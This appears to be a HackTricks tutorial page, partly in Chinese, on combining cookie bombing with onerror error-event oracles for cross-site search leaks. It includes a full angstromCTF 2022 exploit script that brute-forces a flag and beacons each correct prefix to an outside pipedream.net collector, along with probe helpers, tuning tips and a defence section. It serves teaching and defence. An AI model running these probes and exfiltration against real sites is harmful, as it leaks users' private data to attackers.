# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: 将受害者浏览器填充大量/大尺寸的 cookies（针对目标 origin），以致后续请求触及服务器/请求限制（request header size、URL size in redirects 等）。
- Error-event oracle: 使用 <script>（或其他 subresource）探测跨域 endpoint，并通过 onload vs onerror 区分两种状态。

High level idea
- 找到一个目标 endpoint，其在你要检测的两种状态下行为不同（例如搜索结果 “hit” vs “miss”）。
- 确保 “hit” 路径会触发一个大量的 redirect chain 或生成很长的 URL，而 “miss” 路径保持短小。通过大量 cookies 膨胀 request headers，使得只有 “hit” 路径会因超过限制而导致服务器返回 HTTP 错误（例如 431/414/400）。该错误翻转 onerror 事件，从而成为 XS-Search 的 oracle。

When does this work
- 你能让受害者浏览器向目标发送 cookies（例如 cookies 为 SameSite=None，或你可以通过 popup window.open 在 first-party 上下文设置它们）。
- 应用有能被滥用以设置任意 cookies 的功能（例如将可控输入名/值转为 Set-Cookie 的 “save preference” endpoint），或有 post-auth redirect 会把攻击者可控的数据放入 URL。
- 服务器在两种状态下的反应不同，并且在 headers/URL 膨胀后，其中一种状态会越过限制并返回触发 onerror 的错误响应。

Note on server errors used as the oracle
- 431 Request Header Fields Too Large 常在 cookies 导致 request headers 膨胀时返回；414 URI Too Long 或特定服务器的 400 也可能因过长的请求目标而返回。任何这些都会导致子资源加载失败并触发 onerror。[MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Why the popup (window.open)?
- 现代浏览器越来越多地阻止 third-party cookies。打开一个到目标的顶级窗口会让 cookies 成为 first‑party，因此目标返回的 Set-Cookie 响应会生效，即使存在 third‑party cookie 限制也能让 cookie-bomb 步骤起作用。

2024–2025 notes on cookie availability
- Chromium-based 浏览器通常仍会发送 third‑party cookies，除非用户或站点选择退出，但 Safari 和 Firefox 默认阻止大多数 third‑party cookies。为两种情况做准备： (1) 使用 first‑party cookie planting flow (window.open + auto-submit to a cookie-setting endpoint) 然后 (2) 使用一个 subresource 探测，该资源仅在这些 cookies 被发送时才会成功。如果 third‑party cookies 被阻止，则将探测移到 same-site 上下文中（例如，在 popup 中通过 same-site gadget 运行 oracle，并使用 postMessage 或 beacon 将布尔值 exfiltrate 到你的服务器）。

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternative tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
进阶: de Bruijn–based cookie packing (CTF-proven)
- 当应用允许你控制较大的 cookie 值时，你可以通过在每个探测（probe）后附加一个 de Bruijn 序列来高效地打包猜测。这会使每次探测的开销保持较小，同时确保重分支（heavy branch）仅在正确的前缀时才会持续更重。下面是生成 |Σ| 个符号、长度为 n 的示例生成器（适合放入 cookie 值）：
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

构建 oracle 的技巧
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using window.open loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

常见的 header/URL 限制（有用的阈值）
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly. [Cloudflare docs show the 128 KB header limit.]

相关的 XS-Search 技巧
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

防御与强化
- Make success/failure responses indistinguishable:
  - Avoid conditional redirects or large differences in response size between states. Return the same status, same content type, and similar body length regardless of state.
- Block cross-site subresource probes:
  - SameSite cookies: set sensitive cookies to SameSite=Lax or Strict so subresource requests like <script src> don’t carry them; prefer Strict for auth tokens when possible.
  - Fetch Metadata: enforce a Resource Isolation Policy to reject cross-site subresource loads (e.g., if Sec-Fetch-Site != same-origin/same-site).
  - Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (or at least same-site) for endpoints not meant to be embedded as cross-origin subresources.
  - X-Content-Type-Options: nosniff and correct Content-Type on JSON/HTML endpoints to avoid load-as-script quirks.
- Reduce header/URL amplification:
  - Cap the number/size of cookies set; sanitize features that turn arbitrary form fields into Set-Cookie.
  - Normalize or truncate reflected data in redirects; avoid embedding attacker-controlled long strings in Location URLs.
  - Keep server limits consistent and fail uniformly (avoid special error pages only for one branch).

注记
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
